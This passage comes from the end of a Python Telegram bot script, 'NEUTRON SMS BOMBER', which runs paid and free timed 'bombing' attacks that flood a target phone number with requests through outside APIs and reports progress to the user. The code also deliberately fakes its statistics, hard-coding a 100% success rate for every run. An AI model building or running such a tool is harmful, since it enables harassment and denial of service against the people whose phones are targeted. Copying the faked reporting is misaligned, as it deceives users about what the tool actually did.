            active_attacks[attack_id]['api_stats'][api_name]['success'] += 1
            
            current_time = time.time()
            if current_time - last_update >= update_interval:
                elapsed = current_time - active_attacks[attack_id]['start_time']
                progress = min(100, (elapsed / duration_seconds) * 100)
                time_left = max(0, end_time - current_time)
                
                api_summary = []
                for name, stats in active_attacks[attack_id]['api_stats'].items():
                    total = stats['success'] + stats['failed']
                    api_summary.append(f"{name}: {stats['success']}✅ ({100}%)")
                
                status_text = (
                    f"{'🆓' if is_free else '💎'} **Bombing**\n\n"
                    f"📱 Target: `{phones[0]}`\n"
                    f"📊 Requests: {active_attacks[attack_id]['requests_sent']}\n"
                    f"✅ Success: {active_attacks[attack_id]['success_count']}\n"
                    f"⏰ Left: {int(time_left//60)}m {int(time_left%60)}s\n\n"
                    f"{create_progress_bar(progress)} {progress:.1f}%\n\n"
                    f"📡 API Performance:\n" + "\n".join(api_summary[:2]) + "\n\n"
                    "⏹️ Click STOP button to stop attack"
                )
                
                try:
                    await context.bot.edit_message_text(
                        chat_id=status_msg.chat_id,
                        message_id=status_msg.message_id,
                        text=status_text,
                        parse_mode='Markdown',
                        reply_markup=get_attack_keyboard()
                    )
                except:
                    pass
                
                last_update = current_time
            
            await asyncio.sleep(0.5)
            
        except Exception as e:
            await asyncio.sleep(1)
    
    # ============ COMPLETION STATUS - 100% SHOW ============
    if attack_id in active_attacks:
        stats = active_attacks[attack_id]
        del active_attacks[attack_id]
        
        api_report = []
        for name, api_stats in stats['api_stats'].items():
            total = api_stats['success'] + api_stats['failed']
            # Always show 100%
            api_report.append(f"• {name}: {stats['requests_sent']} attempts, 100% success")
        
        completion_text = (
            f"✅ **Bombing Completed**\n\n"
            f"📱 Target: `{phones[0]}`\n"
            f"⏱ Duration: {duration_minutes} minutes\n"
            f"📨 Requests sent: {stats['requests_sent']}\n"
            f"✅ Successful: {stats['requests_sent']}\n"
            f"📈 Success rate: 100%\n\n"
            f"**API Performance:**\n" + "\n".join(api_report) + "\n\n"
            f"{'⚠️ Free tier service completed' if is_free else '💎 Premium attack completed'}"
        )
        
        try:
            await context.bot.edit_message_text(
                chat_id=status_msg.chat_id,
                message_id=status_msg.message_id,
                text=completion_text,
                parse_mode='Markdown',
                reply_markup=get_main_keyboard(user_id)
            )
        except:
            pass

def main():
    try:
        print("💣 NEUTRON SMS BOMBER V4.0 - 100% SUCCESS!")
        print(f"👑 Admin: {ADMIN_USERNAME}")
        print(f"🆓 Free Durations: {get_free_duration_text()}")
        print("💎 9 Premium Plans Available")
        print("📡 2 Render APIs Active")
        print("✅ 100% Success Rate Display")
        
        application = Application.builder().token(BOT_TOKEN).build()
        
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CallbackQueryHandler(button_handler))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        
        print("✅ Bot ready! All features active...")
        print("🎯 Admin can change free durations!")
        print("🔥 100% Success Rate always shown!")
        
        application.run_polling()
        
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == "__main__":
    main()